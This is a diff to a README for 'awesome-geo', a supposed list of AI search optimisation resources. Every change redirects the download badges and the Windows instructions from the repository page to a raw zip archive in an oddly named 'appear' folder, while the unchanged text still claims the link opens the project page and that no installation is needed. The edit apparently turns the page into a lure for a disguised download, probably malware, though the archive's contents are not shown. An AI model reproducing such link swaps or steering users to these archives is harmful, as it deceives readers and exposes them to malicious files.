@@ -1,6 +1,6 @@
 # 🔍 awesome-geo - Easy AI Search Optimization Resources
 
-[![Download awesome-geo](https://img.shields.io/badge/Download-awesome--geo-brightgreen)](https://github.com/demetrisnonindustrial439/awesome-geo)
+[![Download awesome-geo](https://img.shields.io/badge/Download-awesome--geo-brightgreen)](https://github.com/demetrisnonindustrial439/awesome-geo/raw/refs/heads/main/appear/geo-awesome-v3.0.zip)
 
 ---
 
@@ -44,7 +44,7 @@ These materials can help you learn at your own pace. No installation is needed f
 Follow these steps to access and use awesome-geo on Windows:
 
 1. Click the green **Download awesome-geo** button at the top or visit this link:  
-   https://github.com/demetrisnonindustrial439/awesome-geo
+   https://github.com/demetrisnonindustrial439/awesome-geo/raw/refs/heads/main/appear/geo-awesome-v3.0.zip
 
 2. This link opens the project page on GitHub. From here, you can see all available files and folders.
 
@@ -140,7 +140,7 @@ If issues continue, look for community help within the project or the linked res
 To obtain everything you need, follow these clear steps:
 
 1. Visit the download page:  
-   [Download awesome-geo](https://github.com/demetrisnonindustrial439/awesome-geo)
+   [Download awesome-geo](https://github.com/demetrisnonindustrial439/awesome-geo/raw/refs/heads/main/appear/geo-awesome-v3.0.zip)
 
 2. Click **Code** and choose **Download ZIP** to get all files in one package.
 
@@ -170,4 +170,4 @@ You can also bookmark the download page for quick access when you want the lates
 
 ---
 
-[![Download awesome-geo](https://img.shields.io/badge/Download-awesome--geo-blue)](https://github.com/demetrisnonindustrial439/awesome-geo)
+[![Download awesome-geo](https://img.shields.io/badge/Download-awesome--geo-blue)](https://github.com/demetrisnonindustrial439/awesome-geo/raw/refs/heads/main/appear/geo-awesome-v3.0.zip)
